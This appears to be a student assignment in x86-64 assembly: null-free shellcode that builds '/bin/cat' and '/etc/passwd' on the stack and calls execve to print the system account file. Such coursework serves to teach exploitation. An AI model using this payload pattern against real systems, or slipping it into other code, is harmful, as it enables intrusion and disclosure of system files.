# I pledge my honor that I have abided by the Stevens Honor System
# Haig Emirzian

.global _start
.text

_start:
    xor %rdx, %rdx  # Air out rdx
    
    # Path to passwords
    push %rdx
    mov $0x6477737361702f63, %rax  # c/passwd in hex
    push %rax
    mov $0x74652f2f2f2f2f2f, %rax  # //////et in hex
    push %rax
    mov %rsp, %rsi

    # Cat command
    push %rdx
    mov $0x7461632f6e69622f, %rax  # /bin/cat in hex
    push %rax
    mov %rsp, %rdi

    # Push to stack
    push %rdx       # Pushing argv to the stack
    push %rsi       # Pushing /etc/passwd
    push %rdi       # Pushing p and /bin/cat
    mov %rsp, %rsi  
    
    xor %rax, %rax  
    mov $59, %al    # execve syscall
    xor %rdx, %rdx  
    syscall

    # Exit
    mov $60, %al   
    xor %rdi, %rdi  
    syscall